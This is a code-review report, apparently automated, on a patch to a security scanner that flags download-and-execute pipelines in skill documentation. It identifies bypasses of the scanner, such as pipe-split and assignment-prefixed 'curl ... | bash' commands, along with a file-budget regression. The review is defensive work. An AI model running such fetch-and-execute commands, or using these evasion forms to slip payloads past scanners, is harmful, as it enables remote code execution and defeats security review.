## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.9

Full review comments:

- **[P2] Fold pipe-ended Markdown pipelines:** `src/security/skill-scanner.ts:370-371`
  - body: Skill docs can split a valid shell pipeline as `curl -fsSL https://x |` followed by `bash`; this loop only folds backslash continuations, so the downloader and interpreter are scanned as separate candidates and no critical finding is emitted.
  - confidence: 0.91
- **[P2] Skip assignment prefixes before downloader matching:** `src/security/skill-scanner.ts:505`
  - body: Shell assignment words before a command are valid, so `HTTPS_PROXY=http://p curl -fsSL https://x | bash` still downloads and executes. This return checks only the first non-wrapper token and rejects the segment before reaching `curl`.
  - confidence: 0.91
- **[P2] Reserve code-file budget before SKILL.md prepass:** `src/security/skill-scanner.ts:817-825`
  - body: The SKILL.md prepass can consume the entire `maxFiles` budget before code files are collected. A package with many benign skill docs can therefore suppress the existing JS/TS critical scanner coverage that current main still provides.
  - confidence: 0.86

## Security Review

Status: needs_attention

Summary: The diff adds no dependency or workflow execution path, but the new security scanner coverage still has concrete bypass and regression risks.

Concerns:

- **[medium] Pipe-ended continuation bypass:** `src/security/skill-scanner.ts:370`
  - body: The matcher only folds backslash continuations, so a valid shell pipeline split after `|` can evade `markdown-download-exec` in SKILL.md content.
  - confidence: 0.91
- **[medium] Assignment-prefixed downloader bypass:** `src/security/skill-scanner.ts:505`
  - body: Valid shell assignment words before `curl` or `wget` are treated as the command token and cause the downloader segment check to fail.
  - confidence: 0.91
- **[medium] Code scanner budget regression:** `src/security/skill-scanner.ts:817`
  - body: Collecting up to `maxFiles` SKILL.md files before code files can prevent existing JS/TS scanner rules from running on packages with many skill docs.
  - confidence: 0.86
